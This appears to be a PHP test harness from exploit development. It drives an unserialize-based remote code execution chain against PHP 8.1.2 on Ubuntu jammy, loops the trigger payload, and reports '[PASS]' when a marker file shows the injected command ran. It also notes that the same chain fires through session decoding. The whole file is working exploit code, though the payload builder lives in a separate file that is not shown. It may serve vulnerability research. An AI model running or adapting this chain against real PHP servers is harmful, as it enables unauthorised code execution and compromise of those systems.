<?php
// fa_jammy_cli.php — MISSION 3 CLI validation on the jammy system PHP
// (/usr/bin/php8.1, 8.1.2): the full chain through a direct unserialize of
// the a:1020 trigger. Same chain the session decode fires in stage 4.
$MARKER = '/tmp/fa_jammy_rce';
require_once __DIR__ . '/fa_cli_core.php';

D::$cmd = 'sh /tmp/fa_jammy_cmd';
E::init( '8102cli' );
$ATTEMPTS = (int) ( $argv[1] ?? 5 );

@unlink( $MARKER );
@unlink( '/tmp/fa_jammy_diag.log' );
file_put_contents( '/tmp/fa_jammy_cmd', 'id > ' . $MARKER . " 2>&1\n" );

$payload = fa_build_trigger();
for ( $try = 1; $try <= $ATTEMPTS; $try++ ) {
	echo "=== attempt $try ===\n";
	$r = unserialize( $payload );
	echo 'outer ok=', var_export( $r !== false, true ), "\n";
	if ( is_file( $MARKER ) ) { break; }
}
if ( is_file( $MARKER ) ) {
	echo 'MARKER: ', trim( file_get_contents( $MARKER ) ), "\n";
	echo "[PASS] jammy 8.1.2 full chain RCE (CLI, in-band, ASLR on)\n";
} else {
	echo "[FAIL] marker missing\n";
}
